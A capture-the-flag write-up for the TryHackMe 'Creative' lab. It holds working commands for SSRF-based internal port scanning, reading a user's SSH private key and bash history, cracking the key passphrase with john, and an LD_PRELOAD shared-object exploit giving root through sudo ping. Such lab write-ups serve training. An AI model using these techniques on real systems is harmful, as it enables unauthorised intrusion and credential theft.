# TryHackMe Writeup: [Creative](https://tryhackme.com/room/creative)

## Overview:
This machine focuses on subdomain enumeration, internal port discovery via SSRF, and privilege escalation using ```LD_PRELOAD```. Below is a step-by-step walkthrough of how I compromised the target.

## Scanning the Target
Initial Nmap scan:

```python
nmap -sC -sV -p- -T4 10.10.203.179
```
```-sC: Run default scripts```

```-sV: Service/version detection```

```-p-: Scan all 65535 ports```

```-T4: Faster timing```

Discovered ports:

* 22 (SSH)

* 80 (HTTP)

## Exploring the Web Interface
Browsing ```http://10.10.203.179``` showed a website with the domain name ```creative.thm```.
So we added it to ```/etc/hosts```:

```python
echo "10.10.203.179 creative.thm" | sudo tee -a /etc/hosts
```
## Subdomain Enumeration

Used ```ffuf``` to brute-force subdomains:

```python
ffuf -u http://creative.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.creative.thm" -fw 1 -fs 178
```
Flag meanings:

```-w: Wordlist for fuzzing```

```-H: Custom header (Host header here)```

```-fw: Filter responses with 1-word count```

```-fs: Filter responses with 178-byte size```

Found subdomain: ```beta.creative.thm```

Added to ```/etc/hosts```:

```python
echo "10.10.203.179 beta.creative.thm" | sudo tee -a /etc/hosts
```
## SSRF & Internal Port Discovery
The page at ```beta.creative.thm``` accepts a ```url``` input to fetch data from external sources. Testing with:

```python
http://127.0.0.1
```
...returned a response — confirming Server-Side Request Forgery (SSRF).

If the server can request its localhost, we can scan for open internal ports.

We generate a list of ports:

```python
seq 65535 > ports.txt
```
Then scan using wfuzz:

```python
wfuzz -w ports.txt -u http://beta.creative.thm -X POST -d "url=http://127.0.0.1:FUZZ" -t 150 --hh 13
```
Flag meanings:

```-X POST: Use POST method```

```-d: POST data with fuzzing point```

```-t 150: Use 150 threads```

```--hh 13: Hide responses with 13 lines (filter noise)```

Discovered internal ports:

* 80

* 1337

## Extracting Sensitive Info

Using SSRF:

```python
http://127.0.0.1:1337/home
```
We find a username: ```saad```

Checking:

```python
http://127.0.0.1:1337/home/saad
```
We find:

* user.txt

SSH private key:

```python
http://127.0.0.1:1337/home/saad/.ssh/id_rsa
```
> Open browser dev tools (Ctrl+Shift+I), copy key, save as id_rsa.

## Cracking SSH Key

Key is password-protected. Let's crack it:

Convert to hash:

```python
ssh2john id_rsa > key
```
Crack using rockyou:

```python
john --wordlist=/usr/share/wordlists/rockyou.txt key
```
After discovering the passphrase:

```python
chmod 600 id_rsa
ssh -i id_rsa saad@10.10.203.179
```
We now have access as ```saad```.

## Privilege Escalation

Check sudo permissions:

```python
sudo -l
```
We need password — so check history:

```python
cat ~/.bash_history
```
Found credentials, saved them:

```python
echo "saad:<password>" > creds.txt
```
With password, run:

```python
sudo -l
```
Found:

```python
(ALL) NOPASSWD: /usr/bin/ping
```

## Exploiting LD_PRELOAD

Go to ```/tmp```, create ```shell.c```:

```python
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
Compile:

```python
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
> -fPIC generates position-independent code (for shared libraries), -shared creates .so, and -nostartfiles skips standard startup files (for custom _init function).

Run exploit:

```python
sudo LD_PRELOAD=/tmp/shell.so ping
```
You should now have a root shell.

Read the final flag:

```python
cat /root/root.txt
```
## This box was a great mix of web exploitation, local file access, and privilege escalation through shared object injection.
